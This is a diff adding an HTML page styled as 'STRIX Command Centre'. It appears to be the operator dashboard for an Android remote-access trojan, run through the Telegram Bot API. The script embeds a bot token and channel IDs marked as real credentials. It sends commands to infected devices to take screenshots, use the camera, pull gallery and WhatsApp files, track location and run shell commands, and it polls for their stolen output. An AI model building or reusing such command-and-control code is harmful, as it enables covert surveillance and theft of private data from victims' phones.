@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>STRIX · Command Centre</title>
+  <style>
+    /* === Same aesthetic as nexus.html – no changes === */
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+    :root {
+      --bg:#05070A; --bg2:#0A1018; --surface:rgba(255,255,255,.05); --surface2:rgba(255,255,255,.03);
+      --border:rgba(255,255,255,.08); --text:#FFFFFF; --muted:#8A94A6;
+      --cyan:#00D9FF; --blue:#4D8DFF; --green:#00FFB2; --orange:#FFB547; --red:#FF5D5D;
+      --font:'Inter',system-ui,-apple-system,sans-serif; --radius:20px;
+    }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:100vh;-webkit-font-smoothing:antialiased}
+    .app{max-width:480px;margin:0 auto;padding:16px;padding-bottom:100px}
+    .loading{position:fixed;inset:0;background:var(--bg);z-index:999;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .5s}
+    .loading.hidden{opacity:0;pointer-events:none}
+    .loading-ring{width:28px;height:28px;border:2px solid var(--border);border-top-color:var(--cyan);border-radius:50%;animation:spin .8s linear infinite}
+    .loading-title{font-size:16px;font-weight:600;letter-spacing:2px;margin-top:20px;color:var(--text)}
+    .loading-sub{font-size:11px;color:var(--muted);margin-top:6px}
+    .loading-bar{width:160px;height:2px;background:var(--border);margin-top:16px;border-radius:1px;overflow:hidden}
+    .loading-bar-fill{height:100%;width:0;background:var(--cyan);animation:loadBar 2s ease forwards}
+    .loading-credit{font-size:10px;color:var(--muted);opacity:.4;margin-top:40px;letter-spacing:1px}
+    @keyframes spin{100%{transform:rotate(360deg)}}
+    @keyframes loadBar{100%{width:100%}}
+    .header{text-align:center;padding:20px 0 24px}
+    .header h1{font-size:20px;font-weight:500;letter-spacing:-0.5px;margin-bottom:2px;background:linear-gradient(180deg, rgba(255,255,255,0.9) 0%, rgba(255,255,255,0.4) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:inline-block}
+    .header .sub{font-size:12px;color:var(--muted);font-weight:400;letter-spacing:1px}
+    .metrics{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px}
+    .metric-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px;text-align:center;backdrop-filter:blur(24px);transition:transform 0.2s}
+    .metric-card:active{transform:scale(0.97)}
+    .metric-card .val{font-size:28px;font-weight:600;letter-spacing:-1px}
+    .metric-card .lbl{font-size:11px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:1px}
+    .section-title{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:3px;padding:8px 0 12px;font-weight:500}
+    .device-list{display:flex;flex-direction:column;gap:8px}
+    .device-card{display:flex;align-items:center;gap:14px;padding:14px 16px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);backdrop-filter:blur(24px);transition:transform 0.2s,border-color 0.2s,background 0.2s}
+    .device-card:hover{border-color:var(--cyan)}
+    .device-card:active{transform:scale(0.98)}
+    .device-card .status-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+    .device-card.online .status-dot{background:var(--green);box-shadow:0 0 6px var(--green)}
+    .device-card.offline .status-dot{background:var(--red);box-shadow:0 0 6px var(--red)}
+    .device-card.active{border-color:var(--cyan);background:rgba(0,217,255,.05)}
+    .device-info{flex:1;min-width:0}
+    .device-info .name{font-size:15px;font-weight:500}
+    .device-info .meta{font-size:11px;color:var(--muted);margin-top:2px;display:flex;gap:12px;flex-wrap:wrap}
+    .activity-feed{display:flex;flex-direction:column;gap:6px}
+    .activity-item{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:12px;opacity:0;animation:fadeSlide 0.25s ease forwards}
+    @keyframes fadeSlide{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+    .activity-item .dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
+    .activity-item .time{color:var(--muted);width:40px;flex-shrink:0}
+    .activity-item .desc{flex:1;color:var(--text)}
+    .analytics-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+    .analytic-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:14px;backdrop-filter:blur(24px)}
+    .analytic-card .chart{height:40px;background:var(--surface2);border-radius:8px;margin-top:8px;position:relative;overflow:hidden}
+    .analytic-card .chart-fill{position:absolute;bottom:0;left:0;width:100%;background:var(--blue);opacity:.6;border-radius:8px}
+    .notifications{display:flex;flex-direction:column;gap:8px}
+    .notif-card{padding:12px 14px;background:var(--surface);border:1px solid var(--border);border-radius:12px;font-size:12px;display:flex;align-items:center;gap:10px;backdrop-filter:blur(24px)}
+    .notif-card .icon{font-size:16px;color:var(--cyan)}
+    .search-bar{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;margin-bottom:12px;display:flex;align-items:center;gap:8px;backdrop-filter:blur(24px)}
+    .search-bar input{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font);font-size:14px;outline:none}
+    .search-bar input::placeholder{color:var(--muted)}
+    .bottom-nav{position:fixed;bottom:16px;left:50%;transform:translateX(-50%);display:flex;gap:8px;background:var(--surface);backdrop-filter:blur(24px);border:1px solid var(--border);border-radius:24px;padding:6px 12px;z-index:10}
+    .nav-item{padding:8px 16px;border-radius:18px;font-size:12px;color:var(--muted);cursor:pointer;transition:all .2s;white-space:nowrap}
+    .nav-item.active{background:rgba(255,255,255,.1);color:var(--text)}
+    .nav-item:active{transform:scale(.95)}
+    .footer{text-align:center;padding:20px;font-size:10px;color:var(--muted);opacity:.5}
+    .pill{padding:6px 14px;font-size:10px;font-weight:500;letter-spacing:2px;cursor:pointer;color:var(--muted);text-transform:uppercase;border:1px solid var(--border);border-radius:20px;background:transparent;transition:all .2s;white-space:nowrap;font-family:var(--font);backdrop-filter:blur(24px)}
+    .pill:active{border-color:var(--cyan);color:var(--cyan);background:rgba(0,217,255,.05)}
+    .command-bar{display:flex;margin-top:10px;gap:8px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:8px;backdrop-filter:blur(24px)}
+    .command-bar input{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font);font-size:14px;outline:none}
+    .command-bar button{background:var(--cyan);color:#000;border:none;padding:8px 16px;border-radius:12px;font-weight:600;font-size:12px;letter-spacing:1px;cursor:pointer}
+  </style>
+</head>
+<body>
+<div class="loading" id="loading">
+  <div class="loading-ring"></div>
+  <div class="loading-title">STRIX</div>
+  <div class="loading-sub">Establishing Secure Channel…</div>
+  <div class="loading-bar"><div class="loading-bar-fill"></div></div>
+  <div class="loading-credit">Created by Strix</div>
+</div>
+
+<div class="app" id="app" style="display:none">
+  <div class="header">
+    <h1>STRIX</h1>
+    <div class="sub">Command Centre · Tier‑IV Access</div>
+  </div>
+
+  <div class="metrics">
+    <div class="metric-card"><div class="val" id="onlineCount">0</div><div class="lbl">Online</div></div>
+    <div class="metric-card"><div class="val" id="totalCount">0</div><div class="lbl">Total</div></div>
+    <div class="metric-card"><div class="val" id="cmdCount">0</div><div class="lbl">Operations</div></div>
+    <div class="metric-card"><div class="val" id="uptime">00:00</div><div class="lbl">Uptime</div></div>
+  </div>
+
+  <div class="search-bar">
+    <span style="opacity:0.5">🔍</span>
+    <input placeholder="Search devices…" id="searchInput" oninput="filterDevices()">
+  </div>
+
+  <div class="section-title">Quick Actions</div>
+  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">
+    <button class="pill" onclick="quickCmd('/screenshot')">CAPTURE</button>
+    <button class="pill" onclick="quickCmd('/camera')">SENSOR</button>
+    <button class="pill" onclick="quickCmd('/gallery')">ARCHIVE</button>
+    <button class="pill" onclick="quickCmd('/download /sdcard/WhatsApp')">EXTRACT</button>
+    <button class="pill" onclick="quickCmd('/location')">GEOLOC</button>
+    <button class="pill" onclick="quickCmd('/shell ls /sdcard')">STORAGE</button>
+  </div>
+
+  <div class="section-title">Devices <span id="nodeCount" style="color:var(--cyan)">0</span></div>
+  <div class="device-list" id="devices"></div>
+
+  <div class="command-bar">
+    <input id="cmdInput" placeholder="Enter directive..." onkeypress="if(event.key==='Enter')sendCmd()">
+    <button onclick="sendCmd()">TRANSMIT</button>
+  </div>
+
+  <div class="section-title">Activity</div>
+  <div class="activity-feed" id="activity"></div>
+
+  <div class="section-title">Notifications</div>
+  <div class="notifications" id="notifications"></div>
+
+  <div class="footer">Created by Strix</div>
+</div>
+
+<div class="bottom-nav">
+  <div class="nav-item active">Dashboard</div>
+</div>
+
+<script>
+  // ========== REAL CREDENTIALS ==========
+  const BOT_TOKEN = "8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk";
+  const CHANNEL_ID = -1004369057597;
+  const ADMIN_ID = 6732091734;
+  const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+  let devices = {};          // id -> {online, lastSeen, info}
+  let selectedDevice = null;
+  let cmdCounter = 0;
+  let startTime = Date.now();
+  let offset = 0;
+
+  // ========== COMMANDS ==========
+  async function sendCmd() {
+    const cmd = document.getElementById('cmdInput').value.trim();
+    if (!cmd || !selectedDevice) return;
+    // Send to channel so payload picks it up
+    await fetch(`${API}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({chat_id: CHANNEL_ID, text: `${selectedDevice} ${cmd}`})
+    });
+    addActivityLog(`CMD → ${selectedDevice}`, cmd, true);
+    cmdCounter++;
+    document.getElementById('cmdCount').textContent = cmdCounter;
+    document.getElementById('cmdInput').value = '';
+  }
+
+  function quickCmd(cmd) {
+    document.getElementById('cmdInput').value = cmd;
+    sendCmd();
+  }
+
+  // ========== POLL FOR DEVICE MESSAGES ==========
+  async function pollUpdates() {
+    while (true) {
+      try {
+        const resp = await fetch(`${API}/getUpdates?offset=${offset}&timeout=30`);
+        const data = await resp.json();
+        if (data.result) {
+          for (const upd of data.result) {
+            offset = upd.update_id + 1;
+            const msg = upd.channel_post;
+            if (msg && msg.chat && msg.chat.id === CHANNEL_ID) {
+              const text = msg.text || "";
+              const match = text.match(/^\[(.+?)\]\s(.*)/);
+              if (match) {
+                const deviceId = match[1];
+                const output = match[2];
+                if (!devices[deviceId]) {
+                  devices[deviceId] = {online: true, lastSeen: Date.now(), info: "Android"};
+                } else {
+                  devices[deviceId].online = true;
+                  devices[deviceId].lastSeen = Date.now();
+                }
+                addActivityLog(deviceId, output);
+              }
+            }
+          }
+        }
+      } catch(e) {}
+      updateDeviceList();
+      updateStats();
+      await new Promise(r => setTimeout(r, 5000));
+    }
+  }
+
+  function updateDeviceList() {
+    const container = document.getElementById('devices');
+    let html = '';
+    const now = Date.now();
+    for (const [id, dev] of Object.entries(devices)) {
+      // mark offline if no message for 2 minutes
+      if (now - dev.lastSeen > 120000) dev.online = false;
+      const status = dev.online ? 'online' : 'offline';
+      const lastSeen = dev.online ? 'Now' : Math.floor((now - dev.lastSeen)/60000) + ' min ago';
+      html += `
+        <div class="device-card ${status} ${selectedDevice===id?'active':''}" onclick="selectDevice('${id}')">
+          <span class="status-dot"></span>
+          <div class="device-info">
+            <div class="name">${id}</div>
+            <div class="meta">${dev.online ? 'Active' : 'Inactive'} · Last seen: ${lastSeen}</div>
+          </div>
+        </div>`;
+    }
+    container.innerHTML = html || '<div style="color:var(--muted)">No devices connected</div>';
+  }
+
+  function selectDevice(id) {
+    selectedDevice = id;
+    updateDeviceList();
+    document.getElementById('cmdInput').focus();
+  }
+
+  function updateStats() {
+    const online = Object.values(devices).filter(d => d.online).length;
+    document.getElementById('onlineCount').textContent = online;
+    document.getElementById('totalCount').textContent = Object.keys(devices).length;
+    document.getElementById('nodeCount').textContent = Object.keys(devices).length;
+  }
+
+  function filterDevices() {
+    const query = document.getElementById('searchInput').value.toLowerCase();
+    document.querySelectorAll('.device-card').forEach(card => {
+      const name = card.querySelector('.name').textContent.toLowerCase();
+      card.style.display = name.includes(query) ? 'flex' : 'none';
+    });
+  }
+
+  function addActivityLog(device, text, isCmd = false) {
+    const feed = document.getElementById('activity');
+    const time = new Date().toLocaleTimeString('en-US', {hour12: false});
+    const div = document.createElement('div');
+    div.className = 'activity-item';
+    div.innerHTML = `<span class="time">${time}</span><span class="dot" style="background:${isCmd?'var(--cyan)':'var(--green)'}"></span><span class="desc">${device}: ${text}</span>`;
+    feed.prepend(div);
+    if (feed.children.length > 50) feed.lastChild.remove();
+  }
+
+  // Uptime
+  setInterval(() => {
+    const elapsed = Math.floor((Date.now() - startTime)/1000);
+    const h = Math.floor(elapsed/3600).toString().padStart(2,'0');
+    const m = Math.floor((elapsed%3600)/60).toString().padStart(2,'0');
+    const s = (elapsed%60).toString().padStart(2,'0');
+    document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
+  }, 1000);
+
+  // Start
+  pollUpdates();
+  document.getElementById('loading').classList.add('hidden');
+  document.getElementById('app').style.display = 'block';
+</script>
+</body>
+</html>
